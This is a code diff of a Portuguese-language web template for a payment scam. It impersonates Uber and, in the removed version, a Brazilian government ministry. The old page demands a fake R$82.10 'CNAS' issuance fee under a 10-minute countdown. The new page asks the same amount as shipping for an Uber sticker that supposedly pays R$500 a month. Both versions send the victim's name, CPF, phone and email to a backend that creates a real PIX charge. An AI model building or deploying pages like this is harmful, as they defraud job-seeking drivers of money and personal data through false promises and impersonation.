@@ -1,392 +1,291 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Uber - Ativação da Parceria</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
-    <style>
-        @font-face {
-          font-family: 'UberMoveText';
-          src: url('/static/fonts/UberMoveText-Regular.woff') format('woff'), url('/static/fonts/UberMoveText-Regular.ttf') format('truetype');
-          font-weight: 400;
-          font-display: swap;
-        }
-        @font-face {
-          font-family: 'UberMoveText';
-          src: url('/static/fonts/UberMoveText-Bold.woff') format('woff'), url('/static/fonts/UberMoveText-Bold.ttf') format('truetype');
-          font-weight: 700;
-          font-display: swap;
-        }
-        @font-face {
-          font-family: 'UberMove';
-          src: url('/static/fonts/UberMove-Medium.woff') format('woff'), url('/static/fonts/UberMove-Medium.ttf') format('truetype');
-          font-weight: 500;
-          font-display: swap;
-        }
-        
-        * {
-          font-family: "UberMoveText", "UberMove", Arial, sans-serif !important;
-        }
-        
-        body {
-          font-family: "UberMoveText", "UberMove", Arial, sans-serif !important;
-          font-size: 16px;
-          line-height: 24px;
-          color: #333333;
-        }
-        
-        h1, h2, h3, h4, h5, h6 {
-          font-family: "UberMove", "UberMoveText", Arial, sans-serif !important;
-          font-size: 28px !important;
-          font-weight: 700 !important;
-          line-height: 36px !important;
-          color: #333333 !important;
-        }
-        
-        /* Uber Button Styles */
-        .uber-btn, button, .btn, input[type="submit"], input[type="button"] {
-          background: #000 !important;
-          color: #fff !important;
-          font-size: 16px;
-          font-weight: 700;
-          border-radius: 2px !important;
-          padding: 10px 24px;
-          transition: background 0.2s;
-          border: none !important;
-        }
-        .uber-btn:hover, button:hover, .btn:hover, input[type="submit"]:hover, input[type="button"]:hover {
-          background: #222 !important;
-          color: #fff !important;
-        }
-    </style>
-    
-    <!-- Mobile Protection - Execute immediately -->
-    <script src="{{ url_for('static', filename='mobile-protection.js') }}"></script>
-</head>
-<body>
-    <!-- Government Header -->
-    <header class="bg-[#222222] text-white py-2">
-        <div class="container mx-auto flex justify-between items-center px-4">
-            <a class="font-bold text-sm" href="#">
-                <img src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" alt="Logotipo Governo" class="h-6" />
-            </a>
-            <nav>
-                <ul class="flex space-x-4 text-[10px]">
-                    <li>
-                        <a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
-                    </li>
-                    <li>
-                        <a class="hover:underline" href="#">PARTICIPE</a>
-                    </li>
-                    <li>
-                        <a class="hover:underline" href="#">SERVIÇOS</a>
-                    </li>
-                </ul>
-            </nav>
+{% extends "layout.html" %}
+
+{% block title %}Pagamento Adesivo Uber{% endblock %}
+
+{% block content %}
+<div class="container mx-auto px-4 py-6 max-w-4xl">
+    <!-- Header -->
+    <div class="bg-white shadow-lg p-6 mb-6" style="border-radius: 0px !important;">
+        <div class="flex items-center mb-4">
+            <img src="https://i.ibb.co/wFFn5HSn/13093103960002-1.png" alt="Uber" class="h-16 mr-4">
+            <div>
+                <h1 class="text-2xl font-bold text-gray-800">Pagamento do Adesivo</h1>
+                <p class="text-gray-600">Programa Uber - R$ 500,00 Mensais</p>
+            </div>
         </div>
-    </header>
-    <!-- Uber Header -->
-    <div class="bg-[#044785] py-3">
-        <div class="container mx-auto px-4 text-center">
-            <img src="https://i.postimg.cc/zvmGLmsw-/Localiza-Fone-4-1-1.png" alt="Logo Uber" class="h-8 mx-auto" />
+        
+        <div class="bg-black text-white border-l-4 border-black p-4" style="border-radius: 0px !important;">
+            <div class="flex">
+                <div class="flex-shrink-0">
+                    <i class="fa fa-info-circle text-white"></i>
+                </div>
+                <div class="ml-3">
+                    <p class="text-sm text-white">
+                        <strong>Adesivo Obrigatório:</strong> Para receber os R$ 500,00 mensais é necessário instalar o adesivo Uber no veículo.
+                    </p>
+                </div>
+            </div>
         </div>
     </div>
 
-    <!-- Main Content -->
-    <section class="py-10 md:py-14">
-        <div class="container mx-auto px-4 md:px-8 text-center">
-            <h2 class="text-lg md:text-xl font-bold mb-1 leading-tight">Ativação da CNAS - Carteira Nacional do Motorista Parceiro</h2>
-            <div class="w-24 h-2 bg-[#044785] mx-auto mb-3 rounded-full"></div>
-            
-            <!-- Countdown Timer -->
-            <div class="bg-red-50 border border-red-200 rounded-lg p-4 mb-6 max-w-md mx-auto">
-                <div class="text-center">
-                    <h3 class="text-lg font-bold text-red-800 mb-2">⏰ TEMPO LIMITE PARA PAGAMENTO</h3>
-                    <p class="text-red-700 text-sm mb-3">Você tem <strong>10 minutos</strong> para efetuar o pagamento ou perderá a vaga no programa Uber!</p>
-                    <div id="countdown-timer" class="text-2xl font-bold text-red-600 bg-white p-3 rounded-lg">
-                        10:00
-                    </div>
+    <!-- Adesivo Information -->
+    <div class="bg-white shadow-lg p-6 mb-6" style="border-radius: 0px !important;">
+        <h2 class="text-xl font-bold mb-4 text-gray-800">
+            <i class="fa fa-car text-black mr-2"></i>
+            Informações do Adesivo Uber
+        </h2>
+        
+        <div class="grid md:grid-cols-2 gap-4">
+            <div class="space-y-3">
+                <div class="border-b pb-2">
+                    <span class="text-sm text-gray-600">Programa:</span>
+                    <p class="font-medium">Uber Partner</p>
+                </div>
+                <div class="border-b pb-2">
+                    <span class="text-sm text-gray-600">Benefício Mensal:</span>
+                    <p class="font-medium">R$ 500,00</p>
+                </div>
+                <div class="border-b pb-2">
+                    <span class="text-sm text-gray-600">Modalidade:</span>
+                    <p class="font-medium">Adesivo Personalizado</p>
                 </div>
             </div>
-
-            <p class="max-w-3xl mx-auto mb-6 md:mb-10 leading-relaxed text-sm">
-                Para ativar sua Carteira Nacional do Motorista Parceiro (CNAS) e poder iniciar as atividades no Uber, é obrigatório o pagamento da Taxa de Expedição da CNAS junto ao Ministério do Desenvolvimento e Assistência Social. O valor é de <span class="font-bold text-red-600">R$ 82,10</span>.
-            </p>
-
-            <div class="flex flex-col items-center mb-6">
-                <!-- Payment Status Box -->
-                <div class="bg-gray-100 border border-gray-300 rounded-lg p-4 mb-6 w-full max-w-2xl mx-auto">
-                    <div class="flex items-center justify-center space-x-2 mb-4">
-                        <div class="w-6 h-6 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
-                        <span class="text-black600 font-medium text-sm">Aguardando pagamento para finalizar</span>
-                    </div>
-                    <div class="border-t border-gray-300 pt-4 text-left">
-                        <p class="text-sm text-gray-700 mb-3" id="training-info">
-                            Após o pagamento, sua participação no programa será ativada automaticamente e você receberá R$ 500,00 mensais.
-                        </p>
-                        <h4 class="font-semibold text-gray-800 mb-2 text-sm">Benefícios do programa Uber:</h4>
-                        <ul class="list-disc list-inside space-y-1 text-sm text-gray-700">
-                            <li>Autorização para trabalhar como assistente social</li>
-                            <li>Acesso às atividades no Uber</li>
-                            <li>Vaga confirmada no centro de parceria Uber</li>
-                        </ul>
-                    </div>
+            <div class="space-y-3">
+                <div class="border-b pb-2">
+                    <span class="text-sm text-gray-600">Entrega:</span>
+                    <p class="font-medium">Sedex - 3 dias úteis</p>
                 </div>
-
-                <div id="qr-code-section" class="mb-8 flex flex-col items-center">
-                    <div class="flex justify-center mb-4">
-                        <img id="pix-qr-code" src="" alt="QR Code para pagamento da Taxa de Expedição da CNAS" class="w-64 h-64 border-4 border-gray-300 rounded-lg shadow-lg" style="display: none;">
-                    </div>
-                    <p class="text-sm text-gray-600 mb-4 text-center max-w-md">Escaneie o QR Code acima com o app do seu banco para realizar o pagamento da taxa CNAS de <strong>R$ 82,10</strong></p>
+                <div class="border-b pb-2">
+                    <span class="text-sm text-gray-600">Instalação:</span>
+                    <p class="font-medium">Obrigatória no veículo</p>
                 </div>
-            </div>
-
-            <div class="max-w-lg mx-auto" id="pix-code-section">
-                <label for="pix-code" class="block text-sm font-medium text-gray-700 mb-2">Código Pix (Copia e Cola):</label>
-                <div class="relative mb-4">
-                    <input type="text" id="pix-code" value="" readonly class="w-full px-4 py-2 border border-gray-300 rounded-lg text-sm text-gray-700">
-                </div>
-                <button onclick="copyPixCode()" class="bg-green-500 hover:bg-green-600 text-white font-bold px-6 py-3 rounded-lg text-sm w-full shadow-lg transform hover:scale-105 transition-all duration-200 active:scale-95 border-b-4 border-green-700 hover:border-green-800">
-                    <i class="fas fa-copy mr-2"></i>Copiar Código Pix
-                </button>
-            </div>
-
-            <p class="max-w-3xl mx-auto mt-6 mb-6 md:mb-10 leading-relaxed text-sm font-bold text-red-600">
-                Atenção: Conforme a termos do programa de parceria, sem o pagamento da Taxa de Expedição da CNAS não é permitido o início das atividades no Uber. Efetue o pagamento agora!
-            </p>
-
-            <p class="max-w-3xl mx-auto mb-6 md:mb-10 leading-relaxed text-sm">
-                Após a confirmação do pagamento junto ao Ministério do Desenvolvimento e Assistência Social, sua CNAS será ativada e a vaga no Uber será confirmada automaticamente.
-            </p>
-
-            <a href="#" onclick="checkPaymentStatus()" class="bg-[#044785] text-white font-medium px-6 md:px-8 py-3 rounded-full inline-block">Confirmar Pagamento</a>
-        </div>
-    </section>
-
-    <!-- Footer -->
-    <footer class="bg-[#1451B4] text-white py-8 md:py-12">
-        <div class="container mx-auto px-4 md:px-8">
-            <div class="grid grid-cols-1 md:grid-cols-4 gap-8 mb-8 md:mb-12">
-                <div>
-                    <h3 class="text-base font-medium mb-4 text-white">Sobre o Uber</h3>
-                    <ul class="space-y-2 text-sm text-white">
-                        <li><a href="#" class="hover:text-gray-200">O que é o Uber</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Missão e Valores</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Onde Atuamos</a></li>
-                    </ul>
-                </div>
-
-                <div>
-                    <h3 class="text-base font-medium mb-4 text-white">Serviços</h3>
-                    <ul class="space-y-2 text-sm text-white">
-                        <li><a href="#" class="hover:text-gray-200">Proteção Social Básica</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Atendimento às Famílias</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Grupos de Convivência</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Benefícios Sociais</a></li>
-                    </ul>
-                </div>
-
-                <div>
-                    <h3 class="text-base font-medium mb-4 text-white">Assistência Social</h3>
-                    <ul class="space-y-2 text-sm text-white">
-                        <li><a href="#" class="hover:text-gray-200">Cadastro Único</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Bolsa Família</a></li>
-                        <li><a href="#" class="hover:text-gray-200">BPC</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Auxílio Brasil</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Programas Sociais</a></li>
-                    </ul>
-                </div>
-
-                <div>
-                    <h3 class="text-base font-medium mb-4 text-white">Trabalhe Conosco</h3>
-                    <ul class="space-y-2 text-sm text-white">
-                        <li><a href="#" class="hover:text-gray-200">Vagas</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Portal do Servidor</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Capacitações</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Concursos</a></li>
-                    </ul>
-                </div>
-            </div>
-
-            <hr class="border-blue-400 mb-6">
-
-            <div class="flex flex-col md:flex-row justify-between items-center text-xs text-white">
-                <div class="mb-4 md:mb-0">
-                    <span>© Copyright 2025 Uber - Centro de Atendimento Uber</span>
-                </div>
-                <div class="flex flex-wrap justify-center gap-2 md:gap-4">
-                    <a href="#" class="hover:text-gray-200">Mapa do Site</a>
-                    <span>|</span>
-                    <a href="#" class="hover:text-gray-200">Política de Privacidade</a>
-                    <span>|</span>
-                    <a href="#" class="hover:text-gray-200">Lei de Acesso à Informação</a>
-                    <span>|</span>
-                    <a href="#" class="hover:text-gray-200">Acessibilidade</a>
-                    <span>|</span>
-                    <a href="#" class="hover:text-gray-200">Ouvidoria</a>
-                </div>
-                <div class="flex space-x-4 mt-4 md:mt-0">
-                    <a href="#" class="text-white hover:text-gray-200"><i class="fab fa-facebook-square"></i></a>
-                    <a href="#" class="text-white hover:text-gray-200"><i class="fab fa-instagram"></i></a>
+                <div class="border-b pb-2">
+                    <span class="text-sm text-gray-600">Valor do Frete:</span>
+                    <p class="font-medium">R$ 82,10</p>
                 </div>
             </div>
         </div>
-    </footer>
+    </div>
 
-    <script>
-        // 10-minute countdown timer
-        let timeLeft = 10 * 60; // 10 minutes in seconds
-        const timerElement = document.getElementById('countdown-timer');
+    <!-- Requirements -->
+    <div class="bg-white shadow-lg p-6 mb-6" style="border-radius: 0px !important;">
+        <h2 class="text-xl font-bold mb-4 text-gray-800">
+            <i class="fa fa-clipboard-check text-black mr-2"></i>
+            Requisitos do Programa
+        </h2>
+        
+        <div class="grid md:grid-cols-2 gap-4">
+            <div>
+                <h3 class="font-semibold mb-2 text-gray-700">Documentação do Veículo:</h3>
+                <ul class="space-y-1 text-sm text-gray-600">
+                    <li class="flex items-center"><i class="fa fa-check text-green-500 mr-2"></i>CRLV em dia</li>
+                    <li class="flex items-center"><i class="fa fa-check text-green-500 mr-2"></i>Seguro obrigatório</li>
+                    <li class="flex items-center"><i class="fa fa-check text-green-500 mr-2"></i>Veículo até 10 anos</li>
+                </ul>
+            </div>
+            <div>
+                <h3 class="font-semibold mb-2 text-gray-700">Obrigações do Motorista:</h3>
+                <ul class="space-y-1 text-sm text-gray-600">
+                    <li class="flex items-center"><i class="fa fa-check text-green-500 mr-2"></i>CNH categoria B válida</li>
+                    <li class="flex items-center"><i class="fa fa-check text-green-500 mr-2"></i>Instalar adesivo no veículo</li>
+                    <li class="flex items-center"><i class="fa fa-check text-green-500 mr-2"></i>Manter adesivo visível</li>
+                </ul>
+            </div>
+        </div>
+    </div>
 
-        function updateTimer() {
-            const minutes = Math.floor(timeLeft / 60);
-            const seconds = timeLeft % 60;
+    <!-- Payment Summary -->
+    <div class="bg-white shadow-lg p-6 mb-6" style="border-radius: 0px !important;">
+        <h2 class="text-xl font-bold mb-4 text-gray-800">
+            <i class="fa fa-calculator text-black mr-2"></i>
+            Resumo do Pagamento
+        </h2>
+        
+        <div class="space-y-3">
+            <div class="flex justify-between items-center border-b pb-2">
+                <span class="text-gray-600">Frete Adesivo Uber:</span>
+                <span class="font-medium">R$ 82,10</span>
+            </div>
+            <div class="flex justify-between items-center border-b pb-2">
+                <span class="text-gray-600">Entrega Sedex:</span>
+                <span class="font-medium">Incluído</span>
+            </div>
+            <div class="flex justify-between items-center border-b pb-2">
+                <span class="text-gray-600">Adesivo Personalizado:</span>
+                <span class="font-medium">Incluído</span>
+            </div>
+            <div class="flex justify-between items-center text-lg font-bold text-black bg-gray-100 p-3" style="border-radius: 0px !important;">
+                <span>Total a Pagar:</span>
+                <span>R$ 82,10</span>
+            </div>
+        </div>
+    </div>
 
-            timerElement.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+    <!-- Warning -->
+    <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-6" style="border-radius: 0px !important;">
+        <div class="flex">
+            <div class="flex-shrink-0">
+                <i class="fa fa-exclamation-triangle text-yellow-400"></i>
+            </div>
+            <div class="ml-3">
+                <p class="text-sm text-yellow-700">
+                    <strong>Importante:</strong> O adesivo será enviado apenas após confirmação do pagamento via PIX. 
+                    O envio será feito em até 24 horas úteis via Sedex para o endereço cadastrado.
+                </p>
+            </div>
+        </div>
+    </div>
 
-            // Change color when time is running out
-            if (timeLeft <= 120) { // Last 2 minutes
-                timerElement.classList.add('text-red-800');
-            }
-
-            if (timeLeft > 0) {
-                timeLeft--;
-                setTimeout(updateTimer, 1000);
-            } else {
-                timerElement.textContent = "TEMPO ESGOTADO!";
-                timerElement.classList.add('text-red-800', 'font-bold');
-            }
-        }
-
-        // Start the timer when page loads
-        updateTimer();
-
-        function copyPixCode() {
-            const pixCodeInput = document.getElementById('pix-code');
-            pixCodeInput.select();
-            document.execCommand('copy');
+    <!-- Payment Section -->
+    <div class="bg-white shadow-lg p-6 mb-6" style="border-radius: 0px !important;">
+        <h2 class="text-xl font-bold mb-4 text-gray-800">
+            <i class="fa fa-credit-card text-black mr-2"></i>
+            Pagamento PIX
+        </h2>
+        
+        <div class="text-center">
+            <button id="generateCnvPayment" class="uber-btn w-full mb-4">
+                <i class="fa fa-credit-card mr-2"></i>
+                Gerar PIX para Envio do Adesivo
+            </button>
             
-            // Show feedback
-            const button = event.target;
-            const originalText = button.textContent;
-            button.textContent = 'Copiado!';
-            button.classList.add('bg-green-500');
+            <p class="text-sm text-gray-600 mb-4">
+                <i class="fa fa-shield text-green-600 mr-2"></i>
+                Pagamento seguro processado via For4Payments
+            </p>
             
-            setTimeout(() => {
-                button.textContent = originalText;
-                button.classList.remove('bg-green-500');
-            }, 2000);
-        }
-
-        async function checkPaymentStatus() {
-            const paymentId = localStorage.getItem('cnvPaymentId');
-            
-            if (!paymentId) {
-                alert('ID do pagamento não encontrado.');
-                return;
-            }
-            
-            try {
-                const response = await fetch(`/check_cnv_payment_status/${paymentId}`);
-                const result = await response.json();
+            <!-- PIX Information Display (hidden initially) -->
+            <div id="pixInfo" style="display: none;">
+                <div class="bg-gray-50 p-4 mb-4" style="border-radius: 0px !important;">
+                    <h3 class="text-lg font-bold mb-3">PIX Gerado com Sucesso</h3>
+                    
+                    <!-- QR Code -->
+                    <div class="mb-4">
+                        <img id="pixQrCode" src="" alt="QR Code PIX" class="mx-auto w-64 h-64 border-2 border-gray-300" style="border-radius: 0px !important;">
+                    </div>
+                    
+                    <!-- PIX Code -->
+                    <div class="mb-4">
+                        <label class="block text-sm font-medium text-gray-700 mb-2">Código PIX (Copiar e Colar):</label>
+                        <div class="flex">
+                            <input type="text" id="pixCode" readonly class="flex-1 px-3 py-2 border border-gray-300 text-sm" style="border-radius: 0px !important;">
+                            <button onclick="copyPixCode()" class="bg-green-500 hover:bg-green-600 text-white px-4 py-2 text-sm" style="border-radius: 0px !important;">
+                                <i class="fa fa-copy mr-1"></i>Copiar
+                            </button>
+                        </div>
+                    </div>
+                </div>
                 
-                if (result.status === 'paid') {
-                    alert('Pagamento confirmado! Redirecionando para confirmação...');
-                    window.location.href = '/resultado/aprovado';
-                } else if (result.status === 'pending') {
-                    alert('Pagamento ainda pendente. Aguarde o processamento.');
-                } else {
-                    alert('Status do pagamento: ' + result.status);
-                }
-            } catch (error) {
-                console.error('Erro ao verificar pagamento:', error);
-                alert('Erro ao verificar status do pagamento.');
-            }
-        }
+                <h3 class="text-lg font-bold mb-3">Próximos Passos:</h3>
+                <div class="space-y-2">
+                    <div class="flex items-center">
+                        <span class="bg-black text-white text-xs font-medium px-2 py-1 mr-3" style="border-radius: 0px !important;">1</span>
+                        <span class="text-sm">Realize o pagamento via PIX</span>
+                    </div>
+                    <div class="flex items-center">
+                        <span class="bg-black text-white text-xs font-medium px-2 py-1 mr-3" style="border-radius: 0px !important;">2</span>
+                        <span class="text-sm">Aguarde confirmação automática</span>
+                    </div>
+                    <div class="flex items-center">
+                        <span class="bg-black text-white text-xs font-medium px-2 py-1 mr-3" style="border-radius: 0px !important;">3</span>
+                        <span class="text-sm">Receba o adesivo em casa via Sedex</span>
+                    </div>
+                    <div class="flex items-center">
+                        <span class="bg-black text-white text-xs font-medium px-2 py-1 mr-3" style="border-radius: 0px !important;">4</span>
+                        <span class="text-sm">Instale no veículo e ganhe R$ 500/mês</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
 
-        // Load user data and create payment
-        document.addEventListener('DOMContentLoaded', async function() {
-            // Get user data from multiple localStorage sources
-            const userData = JSON.parse(localStorage.getItem('userData') || '{}');
-            const paymentData = JSON.parse(localStorage.getItem('cnvPaymentData') || '{}');
-            
-            // Extract user data from different localStorage keys
-            const userName = paymentData.name || userData.full_name || userData.name || localStorage.getItem('candidateName') || '';
-            const userCPF = paymentData.cpf || userData.cpf || localStorage.getItem('candidateCPF') || '';
-            const userPhone = paymentData.phone || userData.phone || localStorage.getItem('candidatePhone') || '';
-            
-            console.log('Extracted user data:', { name: userName, cpf: userCPF, phone: userPhone });
-            
-            if (userName && userCPF && userPhone) {
-                try {
-                    // Prepare payment data for API (backend expects 'nome' not 'name')
-                    const finalPaymentData = {
-                        nome: userName,
-                        cpf: userCPF,
-                        phone: userPhone,
-                        amount: 82.10,
-                        description: 'Taxa de Expedição da CNV - Ministério da Justiça'
-                    };
-                    
-                    // Create PIX payment with real API
-                    const response = await fetch('/create_cnv_payment', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify(finalPaymentData)
-                    });
-                    
-                    const result = await response.json();
-                    
-                    console.log('API Response:', result);
-                    
-                    if (result.success && result.payment_data) {
-                        const pixData = result.payment_data;
-                        console.log('PIX Data:', pixData);
-                        
-                        // Display real PIX code
-                        if (pixData.pixCopyPaste) {
-                            document.getElementById('pix-code').value = pixData.pixCopyPaste;
-                            console.log('PIX code set successfully');
-                        }
-                        
-                        // Display real QR Code
-                        if (pixData.pixQrCode) {
-                            const qrCodeElement = document.getElementById('pix-qr-code');
-                            qrCodeElement.src = pixData.pixQrCode;
-                            qrCodeElement.style.display = 'block';
-                            console.log('QR Code displayed successfully');
-                        }
-                        
-                        // Store payment ID for status checking
-                        if (pixData.paymentId) {
-                            localStorage.setItem('cnvPaymentId', pixData.paymentId);
-                            console.log('Payment ID stored:', pixData.paymentId);
-                        }
-                        
-                        // Hide loading message and show success
-                        const statusElement = document.querySelector('.text-black600');
-                        if (statusElement) {
-                            statusElement.textContent = 'PIX gerado com sucesso! Efetue o pagamento.';
-                            statusElement.className = 'text-black font-medium text-sm';
-                        }
-                        
-                    } else {
-                        throw new Error(result.error || 'Erro ao criar pagamento PIX');
-                    }
-                } catch (error) {
-                    console.error('Erro ao criar pagamento:', error);
-                    alert('Erro ao carregar dados de pagamento. Tente novamente.');
-                }
-            } else {
-                console.error('Dados do usuário incompletos:', { name: userName, cpf: userCPF, phone: userPhone });
-                alert('Dados do usuário não encontrados. Retorne à página anterior e preencha o formulário.');
-                window.location.href = '/aviso';
-            }
+<script>
+// Generate PIX payment
+document.getElementById('generateCnvPayment').addEventListener('click', async function() {
+    try {
+        // Get user data from localStorage
+        const userData = JSON.parse(localStorage.getItem('userData') || '{}');
+        const candidateName = localStorage.getItem('candidateName') || userData.full_name || userData.name || '';
+        const candidateCPF = localStorage.getItem('candidateCPF') || userData.cpf || '';
+        const candidateEmail = localStorage.getItem('candidateEmail') || userData.email || '';
+        const candidatePhone = localStorage.getItem('candidatePhone') || userData.phone || '';
+        
+        if (!candidateName || !candidateCPF) {
+            alert('Dados do usuário não encontrados. Retorne à página inicial.');
+            return;
+        }
+        
+        // Create payment
+        const response = await fetch('/create_cnv_payment', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                name: candidateName,
+                cpf: candidateCPF,
+                email: candidateEmail,
+                phone: candidatePhone
+            })
         });
-    </script>
-</body>
-</html>
+        
+        const result = await response.json();
+        
+        if (result.success) {
+            const pixData = result.payment_data;
+            
+            // Display QR Code
+            if (pixData.pixQrCode) {
+                document.getElementById('pixQrCode').src = pixData.pixQrCode;
+            }
+            
+            // Display PIX Code
+            if (pixData.pixCopyPaste) {
+                document.getElementById('pixCode').value = pixData.pixCopyPaste;
+            }
+            
+            // Store payment ID for tracking
+            if (pixData.paymentId) {
+                localStorage.setItem('cnvPaymentId', pixData.paymentId);
+            }
+            
+            // Show PIX information
+            document.getElementById('pixInfo').style.display = 'block';
+            document.getElementById('generateCnvPayment').style.display = 'none';
+            
+        } else {
+            alert('Erro ao gerar PIX: ' + (result.error || 'Erro desconhecido'));
+        }
+        
+    } catch (error) {
+        console.error('Erro:', error);
+        alert('Erro ao processar pagamento. Tente novamente.');
+    }
+});
+
+// Copy PIX code function
+function copyPixCode() {
+    const pixCodeInput = document.getElementById('pixCode');
+    pixCodeInput.select();
+    pixCodeInput.setSelectionRange(0, 99999);
+    
+    try {
+        document.execCommand('copy');
+        
+        const button = event.target.closest('button');
+        const originalText = button.innerHTML;
+        button.innerHTML = '<i class="fa fa-check mr-1"></i>Copiado!';
+        button.classList.add('bg-green-600');
+        
+        setTimeout(() => {
+            button.innerHTML = originalText;
+            button.classList.remove('bg-green-600');
+        }, 2000);
+        
+    } catch (err) {
+        alert('Erro ao copiar código PIX');
+    }
+}
+</script>
+{% endblock %}
